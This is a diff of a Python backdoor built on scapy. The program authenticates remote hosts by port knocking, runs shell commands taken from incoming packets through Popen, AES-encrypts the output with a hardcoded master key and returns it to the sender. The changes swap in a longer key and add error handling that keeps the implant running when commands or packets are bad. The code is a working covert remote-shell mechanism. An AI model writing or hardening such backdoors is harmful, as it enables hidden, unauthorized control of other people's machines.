@@ -27,7 +27,7 @@ from scapy.all import *
 from subprocess import *
 from Crypto.Cipher import AES
 CONN_IPS = {}
-MASTER_KEY = "CorrectHorseBatterySta"
+MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
 
 
 # ========================================================================
@@ -130,11 +130,13 @@ def run_cmd(packet):
         command, arguments = data.split(' ', 1)
     except ValueError:
         arguments = None
-
-    if(arguments is not None):
-        output = Popen([command, arguments], stdout=PIPE).communicate()[0]
-    else:
-        output = Popen(data, stdout=PIPE).communicate()[0]
+    try:
+        if(arguments is not None):
+            output = Popen([command, arguments], stdout=PIPE).communicate()[0]
+        else:
+            output = Popen(data, stdout=PIPE).communicate()[0]
+    except OSError:
+        output = "Invalid Command / Command not found"
     output = encrypt_val(output)
     time.sleep(0.1)
     send_data(packet[1].src, packet[2].sport, output)
@@ -170,7 +172,10 @@ def port_knock_auth(packet):
                 print("{} has disconnected".format(ip))
                 return
             # Else just decode the packet
-            run_cmd(packet)
+            try:
+                run_cmd(packet)
+            except IndexError:
+                pass
         # If port is irrelevant
         elif(dport not in access):
             del CONN_IPS[ip]
